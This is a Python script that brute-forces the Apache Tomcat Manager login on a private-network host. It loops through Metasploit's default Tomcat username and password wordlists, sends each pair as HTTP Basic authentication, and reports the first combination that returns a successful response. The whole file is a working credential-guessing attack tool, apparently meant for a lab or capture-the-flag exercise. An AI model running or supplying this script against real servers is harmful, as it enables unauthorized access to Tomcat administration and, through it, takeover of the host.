import requests
import base64
import colorama
import sys


url = 'http://10.10.0.4:8080/manager/html'

wordlist = open('/opt/metasploit-framework/embedded/framework/data/wordlists/tomcat_mgr_default_users.txt', 'r').read().splitlines()
passwordWordlist = open('/opt/metasploit-framework/embedded/framework/data/wordlists/tomcat_mgr_default_pass.txt', 'r').read().splitlines()

def main():
    for username in wordlist:
        for password in passwordWordlist:
            r = requests.get(url, headers = {'Authorization': 'Basic ' + base64.b64encode(f'{username}:{password}'.encode('utf-8')).decode('utf-8')})
            print(r.status_code)
            if r.status_code == 200:
                print(colorama.Fore.GREEN,f'Found credentials: {username}:{password}', colorama.Style.RESET_ALL)
                sys.exit()


main()